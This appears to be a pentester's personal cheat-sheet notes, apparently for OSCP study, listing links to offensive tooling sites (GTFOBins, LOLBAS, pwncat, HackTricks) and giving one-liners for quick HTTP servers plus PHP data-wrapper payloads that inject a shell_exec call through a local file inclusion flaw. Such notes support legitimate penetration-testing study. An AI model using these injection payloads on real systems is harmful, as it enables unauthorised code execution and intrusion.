

https://wadcoms.github.io/
WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.


https://gtfobins.github.io/
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.


https://lolbas-project.github.io/
Living Off The Land Binaries, Scripts and Libraries


https://pwncat.readthedocs.io/en/latest/
pwncat is a command and control framework which turns a basic reverse or bind shell into a fully-featured exploitation platform. After initial connection, the framework will probe the remote system to identify useful binaries natively available on the target system. It will then attempt to start a pseudoterminal on the remote host and provide you with raw terminal access.


http://book.hacktricks.xyz/
Welcome to the page where you will find each trick/technique/whatever I have learnt in CTFs, real life apps, and reading researches and news.



https://ostechnix.com/record-everything-terminal/



https://github.com/A-poc/RedTeam-Tools



OSCP Exam report template markdown
https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
This is the way to generate your OSCP exam report

WebShells
/usr/share/webshells


- http server 
  - python2     - ```shell python -m SimpleHTTPServer 7331```
  - python3     - ```shell python3 -m http.server 7331```
  - php         - ```shell php -S 0.0.0.0:8000```
  - ruby        - ```shell ruby -run -e httpd . -p 9000```
  - busybox     - ```shell busybox httpd -f -p 10000```

- php wrappers for injecting code via LFI vulnerabilites
  - plain text ```http://10.11.10.22/menu.php?file=data:text/plain,hello world```
  - php command ```http://10.11.10.22/menu.php?file=data:text/plin,<?php echo shell_exec("dir") ?>```



https://pentest.ws/tools/venom-builder



